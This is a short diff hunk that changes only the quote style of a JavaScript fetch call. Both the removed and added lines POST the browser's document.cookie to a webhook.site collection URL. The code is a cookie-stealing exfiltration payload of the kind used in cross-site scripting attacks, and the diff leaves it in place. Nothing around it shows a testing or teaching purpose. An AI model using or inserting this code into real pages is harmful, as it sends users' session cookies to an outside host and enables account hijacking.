@@ -1,4 +1,4 @@
-fetch('https://webhook.site/189316b2-fca8-4f5a-aabe-31f9393a49b5', {
+fetch("https://webhook.site/189316b2-fca8-4f5a-aabe-31f9393a49b5", {
   method: 'POST',
   body: document.cookie
 })
